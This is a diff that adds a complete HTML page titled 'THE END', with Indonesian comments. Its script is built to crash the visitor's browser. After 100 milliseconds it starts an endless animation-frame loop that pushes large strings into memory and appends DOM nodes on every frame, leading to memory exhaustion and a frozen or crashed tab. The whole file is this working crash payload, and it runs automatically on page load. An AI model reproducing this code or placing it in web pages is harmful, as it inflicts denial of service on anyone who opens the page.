@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>💀 THE END 💀</title>
+    <style>
+      html, body {
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        background: black;
+        color: white;
+        font-family: monospace;
+        font-size: 2rem;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>😈 You're not ready for this...</h1>
+    <script>
+      // 💣 GABUNGAN: Memory Leak + DOM Overload + Animation Spam
+      let boom = [];
+      function crashLoop() {
+        // Memory fill
+        for (let i = 0; i < 10000; i++) {
+          boom.push("💥".repeat(10000));
+        }
+
+        // DOM spam
+        const div = document.createElement("div");
+        div.textContent = "💀".repeat(1000);
+        document.body.appendChild(div);
+
+        // Gambar ulang terus-terusan
+        requestAnimationFrame(crashLoop);
+      }
+
+      // Delay 100ms biar sempet render dulu lalu langsung CRASH 💥
+      setTimeout(crashLoop, 100);
+    </script>
+  </body>
+</html>
